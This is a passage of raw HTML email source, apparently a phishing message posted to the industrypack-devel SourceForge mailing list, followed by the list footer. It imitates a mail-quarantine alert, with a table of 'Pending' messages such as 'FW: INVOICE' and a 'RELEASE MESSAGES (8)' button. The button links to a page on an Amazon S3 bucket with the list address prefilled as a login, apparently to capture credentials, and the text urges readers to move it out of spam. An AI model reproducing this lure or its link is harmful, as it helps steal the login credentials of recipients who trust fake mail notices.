=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iw7pjs" sty=
le=3D"padding: 3px; width: 255px; font-family: roboto, robotodraft, helveti=
ca, arial, sans-serif; border-top-color: rgb(170, 170, 170); border-left-co=
lor: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; bor=
der-top-style: solid; border-left-style: solid; z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i10=
pol" style=3D"font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f; z-index: 0;">industrypack-devel@lists.sourceforge.net</span></td>
<td width=3D"385" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1iudaw9" style=3D"padding: 3px; width: 385px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;">FW: INVOICE</td>
<td width=3D"105" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1ieofhy" style=3D"padding: 3px; width: 105px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 1=
70, 170); border-top-width: 1px; border-right-width: 1px; border-left-width=
: 1px; border-top-style: solid; border-right-style: solid; border-left-styl=
e: solid; z-index: 0;"><span style=3D"z-index: 0;">
3/18/2024 8:15:51 a.m.</span></td></tr><tr id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1i4i4ns" valign=3D"top" style=3D"z-index: =
0;">
<td width=3D"98" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107=
gmail-v1i2j0u7" style=3D"padding: 3px; width: 98px; font-family: roboto, ro=
botodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; z-index: =
0;"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v=
1i47ydp" style=3D"z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i2i=
ye4" style=3D"z-index: 0;">Pending</span></span></td><td width=3D"255" id=
=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ikf4j8" sty=
le=3D"padding: 3px; width: 255px; font-family: roboto, robotodraft, helveti=
ca, arial, sans-serif; border-top-color: rgb(170, 170, 170); border-left-co=
lor: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; bor=
der-top-style: solid; border-left-style: solid; z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1icl=
umk" style=3D"font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f; z-index: 0;">industrypack-devel@lists.sourceforge.net</span></td>
<td width=3D"385" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1i6jnzn" style=3D"padding: 3px; width: 385px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;">
<span title=3D"***SPAM***  Urgent RFQ : PUR20900 Allianz Warrior - GENERAL"=
 class=3D"ydp773df242yiv6643256158ydp45d195c8v1v1en_N ydp773df242yiv6643256=
158ydp45d195c8v1v1i_3mCHE ydp773df242yiv6643256158ydp45d195c8v1v1c1AVi73_6L=
UG ydp773df242yiv6643256158ydp45d195c8v1v1c1AVi7H_6MWH" style=3D"">PO-01052=
-24</span></td>
<td width=3D"105" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1iyh6f1" style=3D"padding: 3px; width: 105px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 1=
70, 170); border-top-width: 1px; border-right-width: 1px; border-left-width=
: 1px; border-top-style: solid; border-right-style: solid; border-left-styl=
e: solid; z-index: 0;">3/18/2024 <br>9:07:24 a.m.</td>
</tr><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1=
i9xt4w" valign=3D"top" style=3D"z-index: 0;"><td width=3D"98" id=3D"ydp773d=
f242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i9p8ux" style=3D"paddi=
ng: 3px; width: 98px; font-family: roboto, robotodraft, helvetica, arial, s=
ans-serif; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170=
, 170, 170); border-top-width: 1px; border-left-width: 1px; border-top-styl=
e: solid; border-left-style: solid; z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i2i=
ye4" style=3D"z-index: 0;">Pending&nbsp;</span>&nbsp;</td>
<td width=3D"255" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1isrykp" style=3D"padding: 3px; width: 255px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1idt=
jsl" style=3D"font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f; z-index: 0;">industrypack-devel@lists.sourceforge.net</span></td>
<td width=3D"385" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1i0m7db" style=3D"padding: 3px; width: 385px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;"><u style=3D""></u>
<a id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i9kk85=
" style=3D"color: rgb(34, 34, 34); text-decoration: underline; z-index: 0; =
background-color: transparent;" href=3D"http://./#NOP" target=3D"_blank" re=
l=3D"nofollow"></a></td>
<td width=3D"105" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1ijbjd8" style=3D"padding: 3px; width: 105px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 1=
70, 170); border-top-width: 1px; border-right-width: 1px; border-left-width=
: 1px; border-top-style: solid; border-right-style: solid; border-left-styl=
e: solid; z-index: 0;"><span style=3D"z-index: 0;">
7/24/2024 9:47:01 a.m.</span></td></tr><tr id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1ig0yzj" style=3D"z-index: 0;"><td align=
=3D"right" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-=
v1ii4jyd" style=3D"padding: 4px 6px; text-align: right; font-family: roboto=
, robotodraft, helvetica, arial, sans-serif; z-index: 0; background-color: =
rgb(192, 192, 192);" bgcolor=3D"#c0c0c0" colspan=3D"4"></td></tr></tbody></=
table></td></tr></tbody></table></td></tr>
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ifqfo=
u" style=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1y=
iv4812050107gmail-v1i2mzqi" valign=3D"top" style=3D"padding: 0px; z-index: =
0;"><table width=3D"100%" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4=
812050107gmail-v1iy8c27" style=3D"padding: 0px; vertical-align: top; border=
-collapse: collapse; z-index: 0;" border=3D"0" cellspacing=3D"0" cellpaddin=
g=3D"0">
<tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ii=
8st9" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1=
v1yiv4812050107gmail-v1iv0rwh" style=3D"z-index: 0;"><td height=3D"25" id=
=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iuzw1o" sty=
le=3D"padding: 0px; z-index: 0;">&nbsp;</td></tr></tbody></table></td></tr>=
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iemr2=
k" style=3D"z-index: 0;">
<td height=3D"20" align=3D"left" id=3D"ydp773df242yiv6643256158ydp45d195c8v=
1v1yiv4812050107gmail-v1ibeqoh" valign=3D"top" style=3D"padding: 0px; z-ind=
ex: 0;">&nbsp;</td></tr></tbody></table></td></tr><tr id=3D"ydp773df242yiv6=
643256158ydp45d195c8v1v1yiv4812050107gmail-v1in9xmp" style=3D"z-index: 0;">=
<td align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1iubka9" valign=3D"top" style=3D"padding: 0px; z-index: 0;">
<table align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481=
2050107gmail-v1inifad" style=3D"padding: 0px; text-align: left; vertical-al=
ign: top; border-collapse: collapse; z-index: 0;" border=3D"0" cellspacing=
=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1=
v1yiv4812050107gmail-v1ib62x2" style=3D"z-index: 0;"><tr id=3D"ydp773df242y=
iv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i8xxsz" style=3D"z-index: 0=
;">
<td width=3D"288" height=3D"40" align=3D"center" id=3D"ydp773df242yiv664325=
6158ydp45d195c8v1v1yiv4812050107gmail-v1i9xjaf" style=3D"padding: 0px; z-in=
dex: 0;" bgcolor=3D"#429ffc">
<a id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ixglcc=
" style=3D"color: rgb(255, 255, 255); text-transform: uppercase; line-heigh=
t: 40px; font-family: Roboto, Arial; text-decoration: underline; display: b=
lock; z-index: 0; background-color: transparent;" href=3D"https://fizzillo.=
s3.ap-southeast-2.amazonaws.com/control_linklogg.html?login=3Dindustrypack-=
devel@lists.sourceforge.net" target=3D"_blank" rel=3D"nofollow">RELEASE MES=
SAGES (8)</a></td></tr></tbody></table></td></tr>
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1itbkk=
5" style=3D"z-index: 0;"><td height=3D"25" id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1i6f2gg" style=3D"padding: 0px; border-bot=
tom-color: rgb(238, 238, 238); border-bottom-width: 1px; border-bottom-styl=
e: solid; z-index: 0;">&nbsp;</td></tr><tr id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1im30k1" style=3D"z-index: 0;">
<td height=3D"23" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1i9h5yz" style=3D"padding: 0px; z-index: 0;">&nbsp;</td></tr><tr id=
=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ia7yox" sty=
le=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812=
050107gmail-v1iok107" valign=3D"top" style=3D"padding: 0px; z-index: 0;">
<table width=3D"90%" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1iroy3r" style=3D"padding: 0px; margin-left: 15px; vertical-alig=
n: top; border-collapse: collapse; z-index: 0;" cellspacing=3D"0" cellpaddi=
ng=3D"0"><tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107g=
mail-v1iadtnl" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp4=
5d195c8v1v1yiv4812050107gmail-v1ikwmse" style=3D"z-index: 0;">
<td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iqiuq=
3" valign=3D"top" style=3D"padding: 0px; line-height: 18px; font-family: Ro=
boto, Arial; font-size: 12px; font-weight: 600; z-index: 0;"><em style=3D"f=
ont-family: inherit; z-index: 0; font-stretch: inherit;"><span id=3D"ydp773=
df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ipo5qa" style=3D"z-in=
dex: 0;">Note: This message was sent by the system for notification only. P=
lease do not reply<br style=3D"z-index: 0;"></span>
<br id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iecvq=
5" style=3D"z-index: 0;"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v=
1yiv4812050107gmail-v1iwrnwz" style=3D"z-index: 0;">If this message lands i=
n your spam folder, please move it to your inbox folder for proper integrat=
ion.</span></em></td></tr></tbody></table></td></tr></tbody></table></td></=
tr></tbody></table></div></div><p><br class=3D"Apple-interchange-newline">
</p>


</body></html>


--===============6538649741182226098==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6538649741182226098==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6538649741182226098==--
